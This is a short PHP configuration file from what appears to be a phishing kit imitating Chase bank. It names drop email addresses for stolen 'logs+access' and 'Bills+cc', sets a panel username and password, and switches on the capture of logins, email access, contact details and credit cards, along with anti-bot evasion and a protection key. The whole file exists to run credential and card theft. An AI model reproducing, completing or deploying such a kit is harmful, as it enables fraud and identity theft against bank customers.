<?php


// SPAM INFO

$yourname = "SPOX";
$your_email = "spox0day@yandex.com"; // logs+access
$your_email2 = "spox0day2@yandex.com"; // Bills+cc


// LOGIN INFO

$username = "spox1";
$password = "spox2";

// Redirect

$redirect = "chase";


// ON / OFF 
$double_login = "yes";
$double_access = "yes";
$spox_protection = "yes";
$redirection = "yes";
$double_cc = "yes";
$show_start_page = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";
$anti_bot = "yes";


// KEY PROTECTION
$Key = "osQEMBPPikq0yy9qz46GGTSW8vQvNMGQ";



?>